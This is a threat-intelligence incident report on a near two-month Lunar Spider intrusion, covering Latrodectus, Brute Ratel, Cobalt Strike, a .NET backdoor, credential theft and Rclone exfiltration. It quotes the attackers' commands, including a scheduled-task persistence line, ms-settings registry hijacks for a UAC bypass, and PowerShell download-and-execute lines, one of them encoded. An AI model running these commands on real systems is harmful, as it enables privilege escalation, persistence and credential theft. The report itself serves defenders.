			<h1 class="entry-title">From a Single Click: How Lunar Spider Enabled a Near Two-Month Intrusion</h1>
		<div class="entry-meta">
			<span class="posted-on"><a href="https://thedfirreport.com/2025/09/29/from-a-single-click-how-lunar-spider-enabled-a-near-two-month-intrusion/" rel="bookmark"><time class="entry-date published" datetime="2025-09-29T14:30:06+00:00">September 29, 2025</time></a></span>		</div><!-- .entry-meta -->

<h2 class="wp-block-heading">Key Takeaways</h2>



<ul class="wp-block-list">
<li>The intrusion began with a Lunar Spider linked JavaScript file disguised as a tax form that downloaded and executed Brute Ratel via a MSI installer.</li>



<li>Multiple types of malware were deployed across the intrusion, including Latrodectus, Brute Ratel C4, Cobalt Strike, BackConnect, and a custom .NET backdoor.</li>



<li>Credentials were harvested from several sources like LSASS, backup software, and browsers, and also a Windows Answer file used for automated provisioning.</li>



<li>Twenty days into the intrusion data was exfiltrated using Rclone and FTP.</li>



<li>Threat actor activity persisted for nearly two months with intermittent command and control (C2) connections, discovery, lateral movement, and data exfiltration.</li>
</ul>

<h2 id="case-summary" class="wp-block-heading"> </h2>
<ul>
<li style="list-style-type: none;">
<h2 id="case-summary" class="wp-block-heading"><a href="#case-summary">Case Summary</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>The intrusion took place in May 2024, when a user executed a malicious JavaScript file. This JavaScript file has been previously reported as associated with the Lunar Spider initial access group by <a href="https://blog.eclecticiq.com/inside-intelligence-center-lunar-spider-enabling-ransomware-attacks-on-financial-sector-with-brute-ratel-c4-and-latrodectus">EclecticIQ</a>. The heavily obfuscated file, masquerading as a legitimate tax form, contained only a small amount of executable code dispersed among extensive filler content used for evasion. The JavaScript payload triggered the download of a MSI package, which deployed a Brute Ratel DLL file using rundll32.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The Brute Ratel loader subsequently injected Latrodectus malware into the explorer.exe process, and established command and control communications with multiple CloudFlare-proxied domains. The Latrodectus payload was then observed retrieving a stealer module. Around one hour after initial access, the threat actor began reconnaissance activities using built-in Windows commands for host and domain enumeration, including ipconfig, systeminfo, nltest, and whoami commands.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Approximately six hours after initial access, the threat actor established a BackConnect session, and initiated VNC-based remote access capabilities. This allowed them to browse the file system and upload additional malware to the beachhead host.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On day three, the threat actor discovered and accessed an unattend.xml Windows Answer file containing plaintext domain administrator credentials left over from an automated deployment process. This provided the threat actor with immediate high-privilege access to the domain environment.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On day four, the threat actor expanded their activity by deploying Cobalt Strike beacons. They escalated privileges using Windows&#8217; Secondary Logon service and the runas command to authenticate as the domain admin account found the prior day. The threat actor then conducted extensive Active Directory reconnaissance using AdFind. Around an hour after this discovery activity they began lateral movement. They used PsExec to remotely deploy Cobalt Strike DLL beacons to several remote hosts including a domain controller as well as file and backup servers.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>They then paused for around five hours. On their return, they deployed a custom .NET backdoor that created a scheduled task for persistence and setup an additional command and control channel. They also dropped another Cobalt Strike beacon that had a new command and control server. They then used a custom tool that used the Zerologon (CVE-2020-1472) vulnerability to attempt additional lateral movement to a second domain controller. After that they then tried to execute Metasploit laterally to that domain contoller via a remote service. However they were unable to establish a command and control channel from this action.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On day five, the threat actor returned using RDP to access a new server that they then dropped the newest Cobalt Strike beacon on. This was then followed by an RDP logon to a file share server where they also deployed Cobalt Strike. Around 12 hours after that they returned to the beachhead host and replaced the BruteRatel file used for persistence with a new BruteRatel badger DLL. After this there was a large gap before their next actions.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Fifteen days later, the 20th since initial access, the threat actor became active again. They deployed a set of scripts to execute a renamed rclone binary to exfiltrate the data from the file share server. This exfiltration used FTP to send data over a roughly 10 hour period to the threat actor&#8217;s remote host. After this concluded there was another pause in threat actor actions.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On the 26th day of the intrusion the threat actor returned to the backup server and used a PowerShell script to dump credentials from the backup server software. Two days later on the backup server they appeared again and dropped a network scanning tool, rustscan, which they used to scan subnets across the environment. After this hands on activity ceased again.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The threat actor maintained intermittent command and control access for nearly two months following initial compromise, leveraging BackConnect VNC capabilities and multiple payloads, including Latrodectus, Brute Ratel, and Cobalt Strike, before being evicted from the environment. Despite the extended dwell time and comprehensive access to critical infrastructure, no ransomware deployment was observed during this intrusion.</p>

<p><strong>Latrodectus</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>After executing, Brute Ratel deployed Latrodectus malware through process injection into explorer.exe leveraging CreateRemoteThread API. Latrodectus, a downloader <a href="https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice" target="_blank" rel="noreferrer noopener">first identified by Proofpoint researchers</a> in November 2023, is attributed to the same threat actors responsible for developing <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.icedid" target="_blank" rel="noreferrer noopener">IcedID</a>.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<figure id="attachment_48461" aria-describedby="caption-attachment-48461" style="width: 975px" class="wp-caption aligncenter"><a href="https://thedfirreport.com/wp-content/uploads/2025/09/28761_012.png"><img loading="lazy" decoding="async" class="wp-image-48461 size-full" src="https://thedfirreport.com/wp-content/uploads/2025/09/28761_012.png" alt="" width="975" height="210" srcset="https://thedfirreport.com/wp-content/uploads/2025/09/28761_012.png 975w, https://thedfirreport.com/wp-content/uploads/2025/09/28761_012-300x65.png 300w, https://thedfirreport.com/wp-content/uploads/2025/09/28761_012-768x165.png 768w" sizes="auto, (max-width: 975px) 100vw, 975px" /></a><figcaption id="caption-attachment-48461" class="wp-caption-text">Latrodectus being injected into explorer.exe</figcaption></figure>

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Approximately six hours later, the process running Latrodectus established a connection to 193.168.143[.]196 on the beachhead host, which we suspect to have been a BackConnect C2 server. BackConnect is a post-compromise module that was initially deployed by IcedID, allowing threat actors to leverage infected systems for remote access through VNC modules. Multiple security researchers, <a href="https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus" target="_blank" rel="noreferrer noopener">such as Elastic Security Labs</a>, hypothesize that Latrodectus is a potential successor to IcedID, due to code reuse and behavioral similarities, including the use of the same commands in the Discover flag.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>An hour after this traffic started, the following command was executed to switch to UTF-8 encoding:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">cmd.exe /K chcp 65001 &amp;&amp; c: &amp;&amp; cd c:\
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>This command was previously observed in <a href="https://medium.com/walmartglobaltech/keyhole-analysis-60302922aa03" target="_blank" rel="noreferrer noopener">Keyhole</a>, a multi-functional VNC/BackConnect component used by IcedID, and <a href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/" target="_blank" rel="noreferrer noopener">prior cases</a> involving IcedID infection.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>A few minutes later, Latrodectus spawned DLLHost.exe to likely inject the BackConnect payload with PROCESS_ALL_ACCESS (0x1fffff) access rights. The granted access rights provide full control over the target process, enabling memory manipulation, thread creation, and DLL injection capabilities.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/09/28761_013.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-48462" src="https://thedfirreport.com/wp-content/uploads/2025/09/28761_013.png" alt="" width="975" height="258" srcset="https://thedfirreport.com/wp-content/uploads/2025/09/28761_013.png 975w, https://thedfirreport.com/wp-content/uploads/2025/09/28761_013-300x79.png 300w, https://thedfirreport.com/wp-content/uploads/2025/09/28761_013-768x203.png 768w" sizes="auto, (max-width: 975px) 100vw, 975px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph /-->

<!-- wp:paragraph -->
<p><strong>lsassa.exe Backdoor</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On day four, the threat actor deployed and executed a binary named lsassa.exe via BackConnect on the beachhead host.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<figure id="attachment_48463" aria-describedby="caption-attachment-48463" style="width: 975px" class="wp-caption aligncenter"><a href="https://thedfirreport.com/wp-content/uploads/2025/09/28761_014.png"><img loading="lazy" decoding="async" class="wp-image-48463 size-full" src="https://thedfirreport.com/wp-content/uploads/2025/09/28761_014.png" alt="" width="975" height="432" srcset="https://thedfirreport.com/wp-content/uploads/2025/09/28761_014.png 975w, https://thedfirreport.com/wp-content/uploads/2025/09/28761_014-300x133.png 300w, https://thedfirreport.com/wp-content/uploads/2025/09/28761_014-768x340.png 768w" sizes="auto, (max-width: 975px) 100vw, 975px" /></a><figcaption id="caption-attachment-48463" class="wp-caption-text">Threat actor dropping lsassa.exe via BackConnect session</figcaption></figure>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The lsassa.exe file was a .NET backdoor that contained an encrypted payload embedded in an assembly resource file named lsassa&amp;&amp;. Inside this resource, a small header was present declaring which protections were used (encryption and/or compression). If encryption is used, it either uses a key embedded in the file or derives one from the assembly’s public key token, then decrypts the payload. If compression is enabled, the code decompresses the decrypted data before loading it.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The backdoor implemented a persistent command and control system that establishes covert communication between an infected machine and a remote threat actor controlled server while creating a scheduled task for persistence. Upon initialization, the backdoor establishes a timer-based polling mechanism that triggers every 250 seconds to maintain regular contact with the C2 infrastructure and uses extracted obfuscated strings to construct the command. In our case, the threat actor leveraged the backdoor to create a scheduled task on the beachhead host with the command:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted /-->

<!-- wp:paragraph /-->

<!-- wp:paragraph /-->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">"cmd.exe" /c schtasks /create /tn "SchedulerLsass" /tr "%ALLUSERSPROFILE%\USOShared\lsassa.exe" /sc onstart
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>During each communication cycle, the backdoor collects basic system reconnaissance data, including the username and machine name of the infected host, then transmits it to a remote server endpoint. The server C2 (hxxps://cloudmeri.com/comm[.]php) was obfuscated and embedded within the resource file name lsassa$ from the decrypted resource file lsassa&amp;&amp;. After successfully transmitting the victim data, the backdoor waits for a server response containing executable commands.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>When commands are received from the remote server, the backdoor validates that the response content is not empty and executes the payload through the Windows command interpreter. The execution occurs by spawning a new cmd.exe process with the UseShellExecute flag disabled and CreateNoWindow enabled to maintain stealth, while redirecting standard output and error streams to capture results. The backdoor includes a special termination command that allows the remote operator to exit the backdoor by calling Environment.Exit when a specific response string is received.</p>

<p><strong>UAC Bypass</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The Cobalt Strike sys.dll implant executed on the beachhead host initiated a UAC bypass using the <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/post-exploitation_privilege-escalation.htm" target="_blank" rel="noreferrer noopener">elevate uac-token-duplication technique</a>, a <a href="https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/" target="_blank" rel="noreferrer noopener">well-documented registry hijacking method</a> first observed in 2017. This technique exploits the UAC token duplication vulnerability, allowing the Cobalt Strike implant to execute arbitrary code with privileges stolen from elevated processes, successfully achieving privilege escalation without user interaction.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Initial registry modifications hijacked the ms-settings protocol handler to redirect Windows Settings calls to malicious PowerShell commands:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /f /d "cmd.exe /c powershell -nop -w hidden -c "IEX (New-Object Net.Webclient).DownloadString('hxxp://127.0.0[.]1:11664/')"
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /f /d "cmd.exe /c powershell -nop -w hidden -c "IEX (New-Object Net.Webclient).DownloadString('hxxp://127.0.0[.]1:11664/')"
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>Privilege escalation occurred through execution of ComputerDefaults.exe, a trusted Windows binary that queries the hijacked ms-settings protocol with elevated privileges.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>With the elevated token duplicated from ComputerDefaults.exe, multiple PowerShell instances were executed to establish communication with the Cobalt Strike listener, indicating token rights restrictions requiring different execution approaches:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">"cmd.exe" /c powershell -nop -w hidden -c "IEX (New-Object Net.Webclient).DownloadString('hxxp://127.0.0[.]1:11664/')"
powershell -nop -w hidden -c "IEX (New-Object Net.Webclient).DownloadString('hxxp://127.0.0[.]1:11664/')"
"C:\Windows\syswow64\windowspowershell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile
</pre>

<p><strong>Process Injection</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The most common evasion technique that the threat actor utilized was process injection. During its execution, the Brute Ratel loader upfilles.dll launched the final stage of the Latrodectus malware inside the explorer&#8217;s memory.</p>

<h2 id="credential-access" class="wp-block-heading"><a href="#credential-access">Credential Access</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>Latrodectus Stealer Module</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Using <a href="https://www.bitsight.com/blog/latrodectus-are-you-coming-back" target="_blank" rel="noreferrer noopener">command ID 21</a>, the Latrodectus-injected explorer.exe process downloaded the stealer module file fxrm_vn_9.557302425.bin from the C2 server.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Analysis revealed that the stealer lacks functionality to decrypt cookies from current Chrome versions, suggesting the threat actor may not have updated their stealer module to accommodate recent browser security enhancements. The stealer had the hardcoded time of when the stealer module was built &#8211; 00:39:18 Mar 29 2024.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Similar to the Latrodectus loader component, the stealer module dynamically resolved Windows APIs by iterating through the Process Environment Block (<a href="https://en.wikipedia.org/wiki/Process_Environment_Block" target="_blank" rel="noreferrer noopener">PEB)</a> InLoadOrderModuleList, computing CRC32 hashes for each loaded module name, and comparing results against target hash values.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The stealer was capable of harvesting credentials from 29+ Chromium-based browsers, including Google Chrome, Microsoft Edge, Yandex Browser, Vivaldi, Comodo Dragon, Orbitum, Epic Privacy Browser, and other variants. Firefox receives separate handling through profile enumeration targeting cookies.sqlite database files.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>During its execution, it extracted email credentials from Microsoft Outlook configurations across Office versions 11.0-17.0 by querying Windows registry keys. The stealer is also capable of harvesting server configurations including SMTP, POP3, IMAP, and NNTP server addresses, port numbers, usernames, and encrypted passwords. Additionally, it targeted the registry path HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles to extract legacy email configurations from older Windows Mail, Outlook Express, and MAPI profiles that may contain additional cached credentials. Internet Explorer credentials were obtained through COM interface manipulation, accessing the IntelliForms Storage2 system.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The collected data is organized into distinct sections with the below headers:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>cr_pass for Chrome passwords</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>ff_pass for Firefox data</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>ie_pass for Internet Explorer credentials</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>edge_pass for Edge data</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>outlook_pass for email configurations</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>_cookie variants for session data.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Each section contains structured entries with pipe-delimited fields. The complete dataset undergoes base64-encoding. The stealer then creates a shared memory region named 12345 and stores a pointer to the encoded data, which could allow other processes to access the collected information.</p>

<!-- wp:paragraph -->
<p><strong>Answer File Access</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Backconnect was used by the threat actor early in the campaign (day three) to list directories on the beachhead. After listing files in directories, the threat actor focused their attention on the file unattend.xml, an <a href="https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/update-windows-settings-and-scripts-create-your-own-answer-file-sxs?view=windows-11" target="_blank" rel="noreferrer noopener">answer file</a>. Answer files are used to control the configuration of Windows while setting it up from an image.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>One of the components of answer files is called <em>Microsoft-Windows-UnattendedJoin </em>which allows admins to easily domain join devices during setup, this is done by supplying plain text credentials (username and password) in the unattend.xml file. The threat actor collected the file via Backconnect (using the GET C:\Unattend.xml command) and was able to access the plain-text domain admin credentials stored in the file.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/09/28761_037.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-48494" src="https://thedfirreport.com/wp-content/uploads/2025/09/28761_037.png" alt="" width="2555" height="314" srcset="https://thedfirreport.com/wp-content/uploads/2025/09/28761_037.png 2555w, https://thedfirreport.com/wp-content/uploads/2025/09/28761_037-300x37.png 300w, https://thedfirreport.com/wp-content/uploads/2025/09/28761_037-1024x126.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/09/28761_037-768x94.png 768w, https://thedfirreport.com/wp-content/uploads/2025/09/28761_037-1536x189.png 1536w, https://thedfirreport.com/wp-content/uploads/2025/09/28761_037-2048x252.png 2048w" sizes="auto, (max-width: 2555px) 100vw, 2555px" /></a></p>

<!-- wp:paragraph -->
<p><strong>Veeam-Get-Creds</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On day 26 of the intrusion, the threat actor ran the Veeam-Get-Creds.ps1 script from the injected spoolsv.exe process:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAyADQAMAAwADMALwAnACkAOwAgAFYAZQBlAGEAbQAtAEcAZQB0AC0AQwByAGUAZABzAC4AcABzADEA
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>which decoded to:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">IEX (New-Object Net.Webclient).DownloadString('hxxp://127.0.0[.]1:24003/'); Veeam-Get-Creds.ps1
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>This technique has been previously observed by ransomware groups such as Noberus and Vice Society. It typically indicates the threat actor is targeting backup systems for destruction or virtualization infrastructure for encryption (commonly protected by Veeam backup solutions). The Veeam-Get-Creds.ps1 script is publicly available on <a href="https://github.com/sadshade/veeam-creds" target="_blank" rel="noreferrer noopener">GitHub</a>.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Upon executing the script, the threat actor would have obtained any plaintext usernames and passwords stored in the Veeam Credential Manager. These credentials are typically used to authenticate to remote systems for backup operations. Although in this intrusion, this execution was one of the final actions taken by the threat actor.</p>

<h2 id="exfiltration"><a href="#exfiltration">Exfiltration</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>Rclone</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>From a Cobalt Strike beacon on a file share server, the threat actor dropped a data exfiltration toolkit in the ProgramData directory. This included a VBScript launcher (start.vbs), batch automation script (run.bat), renamed Rclone (sihosts.exe), and Rclone configuration file (rclone.conf). This toolkit automated the theft of sensitive data by syncing it to threat actor-controlled cloud storage using the legitimate Rclone utility.</p>
<figure id="attachment_48520" aria-describedby="caption-attachment-48520" style="width: 764px" class="wp-caption aligncenter"><a href="https://thedfirreport.com/wp-content/uploads/2025/09/28761_063.png"><img loading="lazy" decoding="async" class="wp-image-48520 size-full" src="https://thedfirreport.com/wp-content/uploads/2025/09/28761_063.png" alt="" width="764" height="96" srcset="https://thedfirreport.com/wp-content/uploads/2025/09/28761_063.png 764w, https://thedfirreport.com/wp-content/uploads/2025/09/28761_063-300x38.png 300w" sizes="auto, (max-width: 764px) 100vw, 764px" /></a><figcaption id="caption-attachment-48520" class="wp-caption-text">Content of start.vbs</figcaption></figure>

The first rclone.conf file creation occurred three minutes before the second one, with two executions occurring between them, hinting that there may have been a mistake in the first config file dropped by the threat actor. The first execution had a syntax error with specifying the drive to exfiltrate files from (threat actor added an extra colon to the drive), and the second execution showed that the threat actor had initially dropped the config file with an incorrect username added to it.</p>
